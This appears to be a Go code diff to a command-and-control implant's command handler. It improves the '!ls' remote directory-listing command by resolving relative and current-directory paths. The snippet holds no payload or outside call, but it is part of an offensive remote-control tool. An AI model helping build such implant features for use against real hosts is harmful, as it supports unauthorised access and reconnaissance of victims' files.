@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"path/filepath"
 	"runtime"
 	"strconv"
 	"strings"
@@ -32,17 +33,35 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		// Usage: !ls --path <path>
 		path := flags.StringP("path", "p", "", "Path to list")
 		flags.Parse(cmdSlice[1:])
-		if *path == "" {
+
+		listPath := ""
+		switch *path {
+		case "":
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
+		case ".":
+			// list current directory
+			cwd, err := os.Getwd()
+			if err != nil {
+				out = fmt.Sprintf("Error: %v", err)
+			}
+			listPath = cwd
+		default:
+			listPath, err = filepath.Abs(*path)
+			if err != nil {
+				out = fmt.Sprintf("Error: %v", err)
+				return
+			}
 		}
-		entries, err := os.ReadDir(*path)
+
+		entries, err := os.ReadDir(listPath)
 		if err != nil {
-			out = fmt.Sprintf("Error: cant read dir %s: %v", *path, err)
+			out = fmt.Sprintf("Error: cant read dir %s: %v", listPath, err)
 			return
 		}
+		out = listPath
 		for _, entry := range entries {
-			out += fmt.Sprintf("%s\n", entry.Name())
+			out += fmt.Sprintf("\n%s", entry.Name())
 		}
 		return
 
